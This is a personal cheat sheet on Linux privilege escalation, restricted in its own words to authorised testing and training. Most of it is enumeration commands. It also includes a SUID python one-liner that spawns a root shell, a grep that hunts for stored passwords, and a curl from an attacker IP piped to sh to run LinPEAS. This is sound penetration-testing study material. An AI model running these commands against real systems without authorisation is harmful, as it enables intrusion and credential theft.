# Linux Privilege Escalation Cheat Sheet

> ⚠️ **Disclaimer — read first.**
> For **education and authorized testing only** — systems you own, have **written
> permission** to test, or training platforms. **Use at your own risk and responsibility.**
> The author assumes no liability for misuse.

The point of privesc is **enumeration**: run a checklist, and for each result ask *"does this
let me run something as a higher-privileged user?"* You don't memorize exploits — you find the
vector, then look it up (usually on **[GTFOBins](https://gtfobins.github.io)**).

---

## 0. Orient — who am I, what can I touch

```bash
whoami; id              # current user + groups
sudo -l                 # what can I run as root? (look for NOPASSWD / specific binaries)
hostname; uname -a      # kernel/OS (note version for kernel-exploit search)
cat /etc/os-release
```
**What to look for:** `sudo -l` showing allowed commands (→ GTFOBins "sudo"); interesting
group membership (docker, lxd, disk).

---

## The checklist (command → what to look for → where to go)

### 1. SUID / SGID binaries
```bash
find / -perm -u=s -type f 2>/dev/null      # SUID (runs as file owner)
find / -perm -g=s -type f 2>/dev/null      # SGID (runs as file group)
```
**Look for:** anything *not* standard. Normal: `passwd`, `sudo`, `ping`, `mount`, `su`.
**Anomalies = jackpot:** `python`, `perl`, `bash`, `find`, `vim`, `nmap`, `cp`, `tar`, `nano`...
→ Look it up on **GTFOBins → the "SUID" tab**. Example (SUID python):
```bash
/usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### 2. Sudo rights
```bash
sudo -l
```
**Look for:** binaries you can run as root. Even "harmless" ones (`vim`, `less`, `find`, `awk`,
`nmap`) → GTFOBins "sudo" tab → shell as root. Also check sudo **version** (older ones have CVEs).

### 3. Cron jobs (scheduled tasks running as root)
```bash
cat /etc/crontab
ls -la /etc/cron.*
cat /var/spool/cron/crontabs/* 2>/dev/null
```
**Look for:** a root cron that runs a script **you can write to**, or that calls a command by
relative path (→ PATH hijack). Edit the script / plant the binary → runs as root on schedule.

### 4. Writable files that matter
```bash
# world-writable files
find / -writable -type f 2>/dev/null | grep -vE '^/(proc|sys)'
# can you write to /etc/passwd or /etc/shadow?
ls -la /etc/passwd /etc/shadow
```
**Look for:** writable `/etc/passwd` (add a root user), writable root-owned scripts, writable
service/config files.

### 5. PATH hijacking
When a SUID/root program calls another command **without a full path**, you can put a malicious
file earlier in `$PATH`.
```bash
echo $PATH
# then: create a fake binary, prepend its dir to PATH, run the vulnerable program
```

### 6. Capabilities
```bash
getcap -r / 2>/dev/null
```
**Look for:** `cap_setuid` on a binary (e.g. python) → GTFOBins "capabilities" tab → root.

### 7. Kernel exploits (last resort)
```bash
uname -r        # kernel version
```
**Look for:** an old kernel → search the version for a local-privesc CVE (e.g. DirtyCow,
PwnKit). Noisy/risky (can crash the box) — try config-based vectors first.

### 8. Credentials lying around
```bash
grep -rniE 'password|passwd|secret|api[_-]?key' /var/www /home /etc 2>/dev/null
cat ~/.bash_history
find / -name "*.conf" -o -name "config.php" 2>/dev/null
```
**Look for:** passwords in web configs, history files, backups — then reuse (`su`, SSH).

---

## Automate it — LinPEAS
```bash
# serve from attacker box: python3 -m http.server 8000
# on target:
curl http://<attacker-ip>:8000/linpeas.sh | sh
# or: wget ... -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh
```
LinPEAS scans **all** of the above and highlights findings (red/yellow = most interesting).
> Learn the manual checks first (above) so you can **read** what LinPEAS flags instead of
> trusting it blindly — it produces a lot of output, and not every highlight is exploitable.

---

## The mental model
```
1. Orient     → who am I, sudo -l
2. Enumerate  → run the checklist (or LinPEAS)
3. Spot the odd one out → the finding that shouldn't be there
4. Look it up → GTFOBins / CVE search
5. Exploit    → usually one line
```
**Finding the vector is the skill. Exploiting it is the easy part.**

---

*Reference maintained for my own learning. Authorized targets / training only.*
